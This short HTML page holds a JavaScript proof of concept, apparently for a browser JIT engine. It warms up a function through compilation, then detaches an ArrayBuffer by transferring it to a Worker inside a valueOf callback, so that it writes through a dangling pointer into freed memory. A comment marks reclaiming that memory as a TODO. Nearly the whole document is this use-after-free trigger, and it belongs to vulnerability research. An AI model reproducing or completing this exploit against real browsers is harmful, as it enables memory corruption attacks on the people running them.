test
<script>
function func(O, A, F, O2) {
    arguments.push = Array.prototype.push;
    O = 1;
    arguments.length = 0;
    arguments.push(O2);
    if (F == 1) {
        O = 2;
    }
 
    // execute abp.valueOf() and write by dangling pointer
    A[5] = O;
};
 
// prepare objects
var an = new ArrayBuffer(0x8c);
var fa = new Float32Array(an);
 
// compile func
func(1, fa, 1, {});
for (var i = 0; i < 0x10000; i++) {
    func(1, fa, 1, 1);
}
 
var abp = {};
abp.valueOf = function() {
 
    // free 
    worker = new Worker('worker.js');
    worker.postMessage(an, [an]);
    worker.terminate();
    worker = null;
 
    // sleep
    var start = Date.now();
    while (Date.now() - start < 200) {}
 
    // TODO: reclaim freed memory
 
    return 0
};
 
try {
    func(1, fa, 0, abp);
} catch (e) {
    reload()
}

</script>
